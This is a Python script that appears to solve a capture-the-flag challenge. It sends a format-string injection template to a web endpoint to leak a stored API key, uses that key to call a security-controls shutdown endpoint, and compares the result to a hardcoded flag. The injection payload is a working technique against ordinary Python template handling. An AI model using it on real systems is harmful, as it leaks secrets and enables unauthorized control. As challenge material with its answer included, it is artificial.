import requests

HOST = "165.232.154.250"
PORT = 5000
FLAG = "magpie{ju5t_w0rm_4r0und_th3_la53r5}"

def solve() -> bool:
    ENDPOINT = f"http://{HOST}:{PORT}"

    r1 = requests.get(f"{ENDPOINT}/api/v1/employees/format", params={"template": "{person.__init__.__globals__[CONFIG][API_KEY]}"})
    api_key = r1.text

    data = {
        "lasers": [
            "laser0",
            "laser1",
            "laser2",
            "laser3"
        ]
    }

    r2 = requests.post(f"{ENDPOINT}/api/v1/security-controls/shutdown", headers={"X-API-Key": api_key, "Ignore-Lasers": "true"}, json=data)

    r2_split = r2.text.split("\n")

    got_flag = r2_split[2]

    return got_flag == FLAG

if __name__ == "__main__":
    print(solve())
